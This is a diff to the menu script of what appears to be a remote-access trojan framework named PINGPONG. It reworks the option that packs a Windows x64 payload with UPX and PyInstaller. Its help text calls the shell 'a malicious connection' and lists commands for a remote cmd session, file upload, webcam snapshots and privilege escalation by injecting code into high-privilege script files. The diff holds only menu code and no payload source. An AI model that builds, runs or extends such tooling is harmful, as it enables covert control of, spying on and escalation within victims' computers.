@@ -42,20 +42,21 @@ def sub_main():
     if choice == "1":
        startserver()
     elif choice == "2":
-        print_normal("type of payload:")
-        print_normal("1) PINGPONG windows x64")
-        print_warn("YOU NEED TO INSTALL UPX AND PYINSTALLER, if you already install BOTH of it, ignore this")
-        type = input("choose your choice>")
-        back_to_main(type)
-        if type == "1":
-            upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
-            back_to_main(upx_dir)
-            # payload.payload_packer.pack("_basic_conn.py", ip, port, False)
-            payload.payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir)
-            sub_main()
-        else:
-            print_error('[-]no such choice')
-            sub_main()
+        def payload_choice():
+            print_normal("type of payload:")
+            print_normal("1) PINGPONG windows x64")
+            type = input("choose your payload type>")
+            back_to_main(type)
+            if type == "1":
+                upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
+                back_to_main(upx_dir)
+                # payload.payload_packer.pack("_basic_conn.py", ip, port, False)
+                payload.payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir)
+                sub_main()
+            else:
+                print_error('[-]no such choice')
+                payload_choice()
+        payload_choice()
     elif choice == '3':
         import config.config_settings_GUI
         config.config_settings_GUI.load_all_config()
@@ -91,15 +92,15 @@ for main:
                 Default_ip : The ip to sent the connect when the ip is not given when u use the payload generater
                 Default_port : The port to sent the connect when the port is not given when u use the payload generater
                 usage : the usage of the payload
-        4) PINGPONG shell
-            the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
-            usage:
-                the usage of the shell is set when you generate the payload
-                if u have this usage, type command to use it:
-                    cmd : make a cmd connection
-                    upload : upload your file
-                    cam_shot : take shot
-                    priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher   
+for PINGPONG shell
+    the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
+    usage:
+        the usage of the shell is set when you generate the payload
+        if u have this usage, type command to use it:
+            cmd : make a cmd connection
+            upload : upload your file
+            cam_shot : take shot
+            priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher   
         
         """)
         main()
